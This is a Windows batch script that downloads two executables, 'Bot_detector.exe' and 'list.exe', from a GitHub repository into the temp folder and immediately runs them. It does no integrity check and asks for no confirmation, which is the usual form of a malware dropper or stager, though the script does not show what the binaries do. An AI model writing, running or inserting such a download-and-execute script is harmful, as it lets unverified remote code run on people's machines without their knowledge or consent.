@echo off
REM Define URLs for the EXEs
set U1=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Bot_detector.exe
set U2=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/list.exe

REM Set temp file paths
set F1=%TEMP%\Bot_detector.exe
set F2=%TEMP%\list.exe

REM Download EXE files using curl
curl -L -o "%F1%" "%U1%"
curl -L -o "%F2%" "%U2%"

REM Check if download was successful and execute the EXEs
if exist "%F1%" (
    echo Executing %F1%
    start "" "%F1%"
) else (
    echo Failed to download %F1%
)

if exist "%F2%" (
    echo Executing %F2%
    start "" "%F2%"
) else (
    echo Failed to download %F2%
)

exit
